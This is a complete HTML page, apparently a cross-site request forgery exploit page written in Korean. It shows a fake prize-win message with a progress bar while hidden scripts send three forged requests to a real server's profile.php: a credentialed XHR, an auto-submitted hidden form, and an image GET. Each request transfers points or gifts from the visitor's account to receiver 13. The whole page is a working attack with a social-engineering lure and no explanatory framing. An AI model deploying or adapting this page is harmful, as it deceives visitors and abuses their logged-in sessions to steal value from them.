<!DOCTYPE html>
<html>
<head>
    <title>🎁 완벽한 우회 공격</title>
</head>
<body>
    <div style="text-align: center; padding: 50px;">
        <h1>🎁 축하합니다! 특별 이벤트 당첨!</h1>
        <p>🎯 포인트 지급 중...</p>
        <div id="progress">0%</div>
    </div>

    <script>
        // 진행률 애니메이션
        let progress = 0;
        const progressEl = document.getElementById('progress');
        const progressTimer = setInterval(() => {
            progress += 10;
            progressEl.textContent = progress + '%';
            if (progress >= 100) {
                clearInterval(progressTimer);
                progressEl.textContent = '완료! 🎉';
            }
        }, 300);

        // CSRF 공격들
        function attack1() {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://3.35.218.180/profile.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.withCredentials = true;
                
                const data = 'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=XHR공격성공!';
                xhr.send(data);
            } catch(e) {
                console.log('XHR 차단됨, 다른 방법 시도...');
            }
        }

        function attack2() {
            // 동적 form 생성 및 전송
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.35.218.180/profile.php';
            form.target = '_blank';
            form.style.display = 'none';

            const fields = {
                receiver_id: '13',
                points: '85',
                send_gift: '1',
                gift_type: 'cake',
                message: '폼 공격 성공!'
            };

            Object.entries(fields).forEach(([name, value]) => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            });

            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
        }

        function attack3() {
            // 이미지 태그를 이용한 GET 요청 (만약 GET도 처리한다면)
            const img = new Image();
            img.src = 'http://3.35.218.180/profile.php?receiver_id=13&points=25&send_gift=1&gift_type=flower&message=IMG공격';
            img.style.display = 'none';
            document.body.appendChild(img);
        }

        // 순차 공격 실행
        setTimeout(attack1, 1000);
        setTimeout(attack2, 2000);  
        setTimeout(attack3, 3000);

        console.log('🔴 GitHub Pages 다중 우회 공격 시작!');
        console.log('📊 3가지 방식으로 동시 공격 중...');
    </script>
</body>
</html>
